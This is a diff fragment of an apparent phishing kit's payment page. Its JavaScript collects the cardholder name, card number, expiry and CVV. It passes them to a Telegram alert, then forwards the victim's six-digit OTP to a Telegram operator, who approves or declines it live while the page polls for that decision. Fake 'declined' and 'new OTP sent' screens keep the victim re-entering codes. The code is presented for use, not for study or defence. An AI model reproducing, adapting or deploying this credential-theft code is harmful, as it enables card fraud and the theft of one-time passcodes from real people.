+  p.innerHTML=`<span class="pdot"></span>Waiting for authorization…`;
+}
+function showBankDeclined(){
+  show('s3',60);showStrip();
+  document.getElementById('bankSub').innerHTML=`Authorization was declined.<br/><strong style="color:#e08a30">Please check your banking app and try again.</strong>`;
+  const p=document.getElementById('bankPulse');p.style.color='#e74c3c';
+  p.innerHTML=`<span class="pdot" style="background:#e74c3c"></span>Authorization declined — waiting for retry`;
+}
+function showOTPDeclined(){
+  show('s4',60);showStrip();
+  document.getElementById('otpSub').textContent='A new OTP has been sent to your registered mobile number';
+  document.getElementById('otpErr').textContent='';
+  const boxes=document.querySelectorAll('#otpBoxes input');
+  boxes.forEach(b=>{b.value='';b.classList.remove('filled','err');});
+  startTimer();boxes[0].focus();
+}
+function showSuccess(){
+  const ref='CCA'+Math.random().toString(36).slice(2,10).toUpperCase();
+  document.getElementById('refNo').textContent=ref;
+  document.getElementById('payTime').textContent=new Date().toLocaleString('en-AE',{day:'2-digit',month:'short',year:'numeric',hour:'2-digit',minute:'2-digit'});
+  showStrip();show('s5',100);
+}
+
+// Submit
+async function submitPayment(){
+  savedName=document.getElementById('cardName').value.trim();
+  savedNum=document.getElementById('cnum').value.trim();
+  savedExpM=document.getElementById('expM').value;
+  savedExpY=document.getElementById('expY').value;
+  savedCvv=document.getElementById('cvv').value.trim();
+  if(!savedName||!savedNum||!savedExpM||!savedExpY||!savedCvv){alert('Please fill in all card details.');return;}
+  show('s2',33);showStrip();animateSteps();
+  await sendTelegramAlert();
+  pollTimer=setInterval(poll,3000);
+}
+function animateSteps(){
+  const steps=['ls1','ls2','ls3'],dots=['ld1','ld2','ld3'];let i=0;
+  function next(){
+    if(i>0){document.getElementById(steps[i-1]).className='ls ok';document.getElementById(dots[i-1]).innerHTML=`<svg width="9" height="9" fill="none" stroke="white" stroke-width="2.5" stroke-linecap="round" viewBox="0 0 12 12"><polyline points="2,6 5,9 10,3"/></svg>`;}
+    if(i<steps.length){document.getElementById(steps[i]).className='ls on';i++;setTimeout(next,i===3?9999999:1300);}
+  }
+  next();
+}
+
+// OTP
+function otpIn(el,i){
+  el.value=el.value.replace(/\D/g,'');
+  el.classList.toggle('filled',el.value!=='');
+  const b=document.querySelectorAll('#otpBoxes input');
+  if(el.value&&i<5)b[i+1].focus();
+}
+function otpKey(el,i){if(event.key==='Backspace'&&!el.value&&i>0)document.querySelectorAll('#otpBoxes input')[i-1].focus();}
+async function verifyOTP(){
+  const boxes=document.querySelectorAll('#otpBoxes input');
+  const code=[...boxes].map(b=>b.value).join('');
+  if(code.length<6){
+    document.getElementById('otpErr').textContent='Please enter all 6 digits.';
+    boxes.forEach(b=>b.classList.add('err'));
+    setTimeout(()=>boxes.forEach(b=>b.classList.remove('err')),600);return;
+  }
+  document.getElementById('otpErr').textContent='';
+  show('s2',80);showStrip();
+  document.getElementById('loadSub').textContent='Verifying your OTP, please wait…';
+  clearInterval(pollTimer);
+  await tgEdit(
+    `🔢 <b>OTP SUBMITTED</b>\n\n💰 AED 10,500.00\n👤 ${savedName}\n🆔 <code>${SESSION_ID}</code>\n📟 <b>OTP Entered:</b> <code>${code}</code>\n\n<b>Your decision:</b>`,
+    [[{text:'✅ Approve Payment',callback_data:`APPROVE_${SESSION_ID}`},{text:'❌ Decline OTP',callback_data:`DECLINE_OTP_${SESSION_ID}`}]]
+  );
+  pollTimer=setInterval(poll,3000);
+}
+let timerInt;
+function startTimer(){
+  let s=30;const el=document.getElementById('timerTxt');
+  clearInterval(timerInt);
+  timerInt=setInterval(()=>{s--;if(el)el.textContent=s+'s';if(s<=0){clearInterval(timerInt);const rl=document.getElementById('resendLink');if(rl)rl.innerHTML='Resend now';}},1000);
+}
+function resendOTP(){
+  startTimer();
+  document.querySelectorAll('#otpBoxes input').forEach(i=>{i.value='';i.classList.remove('filled');});
+  document.getElementById('otpErr').textContent='';
+  document.querySelectorAll('#otpBoxes input')[0].focus();
+}
+</script>
+</body>
+</html>
